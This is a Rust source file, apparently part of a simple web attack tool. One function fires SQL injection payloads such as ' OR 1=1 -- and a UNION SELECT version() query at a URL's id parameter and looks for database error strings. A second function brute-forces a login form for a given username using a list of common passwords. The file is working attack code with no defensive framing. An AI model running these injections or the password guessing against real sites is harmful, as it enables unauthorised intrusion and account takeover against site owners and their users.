// src/web_attacks.rs
use reqwest::Client;
use std::time::Duration;

// 1. SQL Injection Check
pub async fn check_sqli(client: &Client, url: &str) {
    println!("\n[☠️] Testing for SQL Injection on {}...", url);
    

    let payloads = vec![
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT 1, version() --"
    ];

    for payload in payloads {
    
        let attack_url = format!("{}?id={}", url, payload); 
        
        println!("    🚀 Injecting: {}", payload);
        
        if let Ok(resp) = client.get(&attack_url).send().await {
            let body = resp.text().await.unwrap_or_default();
            // Database Error 
            if body.contains("SQL syntax") || body.contains("mysql_fetch") || body.contains("ORA-") {
                println!("    🔥 VULNERABLE! SQL Error detected with payload: {}", payload);
            }
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
}

// 2. Login Brute-force 
pub async fn brute_force_login(client: &Client, url: &str, username: &str) {
    println!("\n[🔨] Starting Login Brute-force on {} for user '{}'...", url, username);
    

    let passwords = vec!["123456", "password", "admin", "admin123", "welcome", "1234"];
    
    for pass in passwords {
        // POST Request
        let params = [("username", username), ("password", pass)];
        
        println!("    Trying: {} / {}", username, pass);
        
        let res = client.post(url)
            .form(&params)
            .send()
            .await;

        if let Ok(response) = res {
         
            if response.status().as_u16() == 302 || response.status().is_success() {
           
                 if response.content_length().unwrap_or(0) > 500 { 
                     println!("    ✅ Possible Success: {}", pass);
                 }
            }
        }
        tokio::time::sleep(Duration::from_millis(1000)).await; 
    }
}